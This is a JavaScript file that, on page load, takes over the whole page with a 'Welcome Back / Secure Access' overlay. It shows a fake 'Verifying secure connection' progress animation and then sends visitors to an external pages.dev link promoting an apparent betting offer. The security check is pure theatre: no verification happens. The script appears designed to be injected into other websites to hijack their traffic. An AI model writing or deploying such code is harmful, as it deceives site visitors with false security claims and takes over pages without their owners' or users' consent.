(function() {
    const CONFIG = {
        progressDuration: 500,
        redirectURL: 'https://registernow-7ps.pages.dev/api/?campaign=welcome'
    };

    function getTarget() {
        return CONFIG.redirectURL;
    }

    const style = document.createElement('style');
    style.textContent = `
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Montserrat", sans-serif;
            font-weight: bold;
            margin: 0;
            padding: 0;
            overflow: hidden !important;
        }
        
        body.modal-active {
            overflow: hidden !important;
        }
        
        .access-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .access-card {
            background: #242526;
            border-radius: 20px;
            padding: 2rem;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            position: relative;
            transform: scale(0.95);
            opacity: 0;
            animation: cardEntry 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
        }
        
        @keyframes cardEntry {
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        .close-access {
            position: absolute;
            top: 1.25rem;
            right: 1.25rem;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: transparent;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #ffffff;
            transition: all 0.2s ease;
            line-height: 1;
        }
        
        .close-access:hover {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .access-header {
            margin-bottom: 1rem;
        }
        
        .access-header h2 {
            font-size: 2rem;
            font-weight: 700;
            color: #f48220;
            margin-bottom: 0.75rem;
            letter-spacing: -0.5px;
        }
        
        .access-badge {
            display: inline-block;
            background: #d1d1d6;
            color: #636366;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
        }
        
        .access-content {
            margin: 1.5rem 0 2rem 0;
        }
        
        .access-content p {
            font-size: 22.5px;
            color: #ffffff;
            line-height: 1.6;
        }
        
        .access-status {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 16px 20px;
            background: #d1f4e0;
            border-radius: 14px;
            margin-bottom: 1.5rem;
            transition: background 0.3s ease;
        }
        
        .status-indicator {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            border: 2.5px solid #34c759;
            position: relative;
            flex-shrink: 0;
            background: transparent;
        }
        
        .status-indicator::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 10px;
            height: 10px;
            background: #34c759;
            border-radius: 50%;
            transform: translate(-50%, -50%);
        }
        
        .status-message {
            font-size: 22.5px;
            color: #1d4d2b;
            font-weight: 500;
        }
        
        .progress-section {
            margin-bottom: 1.5rem;
            opacity: 0;
            animation: slideUp 0.8s ease-out 0.5s forwards;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .progress-track {
            width: 100%;
            height: 4px;
            background: #e5e7eb;
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }
        
        .progress-value {
            height: 100%;
            background: linear-gradient(90deg, #c9a50a 0%, #f0c419 100%);
            border-radius: 10px;
            width: 0%;
            transition: width 0.1s linear;
            box-shadow: 0 0 10px rgba(201, 165, 10, 0.5);
        }
        
        .progress-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 8px;
            font-size: 0.75rem;
            color: #ffffff;
        }
        
        .loading-indicator {
            display: inline-flex;
            gap: 3px;
        }
        
        .loading-indicator span {
            width: 4px;
            height: 4px;
            background: #ffffff;
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out both;
        }
        
        .loading-indicator span:nth-child(1) {
            animation-delay: -0.32s;
        }
        
        .loading-indicator span:nth-child(2) {
            animation-delay: -0.16s;
        }
        
        @keyframes bounce {
            0%, 80%, 100% {
                transform: scale(0.8);
                opacity: 0.5;
            }
            40% {
                transform: scale(1.2);
                opacity: 1;
            }
        }
        
        .action-buttons {
            display: flex;
            gap: 12px;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .action-buttons.active {
            opacity: 1;
            pointer-events: auto;
        }
        
        .action-btn {
            flex: 1;
            padding: 16px 24px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 15px;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
            text-align: center;
        }
        
        .proceed-btn {
            background: #c9a50a;
            color: white;
            box-shadow: 0 2px 8px rgba(201, 165, 10, 0.3);
            width: 100%;
        }
        
        .proceed-btn:hover {
            background: #b69609;
            box-shadow: 0 4px 12px rgba(201, 165, 10, 0.4);
        }
        
        .proceed-btn:active {
            transform: scale(0.98);
        }
        
        .transition-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            z-index: 10001;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
            text-align: center;
        }
        
        .transition-overlay.active {
            display: flex;
        }
        
        .transition-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #c9a50a;
            border-radius: 50%;
            animation: rotate 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media screen and (max-width: 500px) {
            .access-card {
                padding: 1.5rem;
                max-width: 95%;
                border-radius: 16px;
            }
            
            .access-header h2 {
                font-size: 1.75rem;
            }
            
            .action-btn {
                width: 100%;
            }
        }
    `;
    document.head.appendChild(style);

    const fontLink = document.createElement('link');
    fontLink.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap';
    fontLink.rel = 'stylesheet';
    document.head.appendChild(fontLink);

    const modalHTML = `
        <div class="access-overlay" id="accessOverlay">
            <div class="access-card">
                <button class="close-access" id="closeAccess">×</button>
                
                <div class="access-header">
                    <h2>Welcome Back</h2>
                    <span class="access-badge">Secure Access</span>
                </div>
                
                <div class="access-content">
                    <p>We're preparing your personalized experience. Be On Anything. Anywhere. Anytime. New Customers Only</p>
                </div>
                
                <div class="access-status" id="accessStatus">
                    <div class="status-indicator"></div>
                    <span class="status-message">Verifying secure connection</span>
                </div>
                
                <div class="progress-section">
                    <div class="progress-track">
                        <div class="progress-value" id="progressValue"></div>
                    </div>
                    <div class="progress-info">
                        <span id="statusInfo">Initializing<span class="loading-indicator"><span></span><span></span><span></span></span></span>
                        <span id="progressPercentage">0%</span>
                    </div>
                </div>
                
                <div class="action-buttons" id="actionButtons">
                    <button class="action-btn proceed-btn" id="proceedBtn">Continue</button>
                </div>
            </div>
        </div>
        
        <div class="transition-overlay" id="transitionOverlay">
            <div class="transition-spinner"></div>
            <h3>Redirecting to your destination...</h3>
            <p>Please wait a moment</p>
        </div>
    `;

    function init() {
        document.body.style.overflow = 'hidden';
        document.body.classList.add('modal-active');
        
        document.body.insertAdjacentHTML('beforeend', modalHTML);

        const overlay = document.getElementById('accessOverlay');
        const transitionScreen = document.getElementById('transitionOverlay');
        const closeBtn = document.getElementById('closeAccess');
        const proceedBtn = document.getElementById('proceedBtn');
        const progressBar = document.getElementById('progressValue');
        const progressText = document.getElementById('progressPercentage');
        const statusInfo = document.getElementById('statusInfo');
        const actionSection = document.getElementById('actionButtons');
        const statusSection = document.getElementById('accessStatus');
        const statusMessage = statusSection.querySelector('.status-message');

        setTimeout(function() {
            overlay.style.display = 'flex';
        }, 100);

        setTimeout(function() {
            startProgress();
        }, 1000);

        function startProgress() {
            let progress = 0;
            const interval = 50;
            const step = (interval / CONFIG.progressDuration) * 100;

            const progressTimer = setInterval(function() {
                progress += step;
                
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(progressTimer);
                    
                    progressBar.style.width = '100%';
                    progressText.textContent = '100%';
                    statusInfo.innerHTML = 'Ready ✓';
                    statusMessage.textContent = 'Connection verified ✓';
                    statusSection.style.background = 'linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%)';
                    
                    setTimeout(function() {
                        actionSection.classList.add('active');
                    }, 300);
                    
                } else {
                    progressBar.style.width = Math.round(progress) + '%';
                    progressText.textContent = Math.round(progress) + '%';
                }
            }, interval);
        }

        function closeModal() {
            overlay.style.display = 'none';
            transitionScreen.classList.remove('active');
            document.body.style.overflow = 'auto';
            document.body.classList.remove('modal-active');
        }

        proceedBtn.addEventListener('click', function() {
            transitionScreen.classList.add('active');
            overlay.style.display = 'none';
            
            setTimeout(function() {
                window.location.href = getTarget();
            }, 500);
        });
        
        closeBtn.addEventListener('click', closeModal);

        overlay.addEventListener('click', function(e) {
            if (e.target.id === 'accessOverlay') {
                closeModal();
            }
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeModal();
            }
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
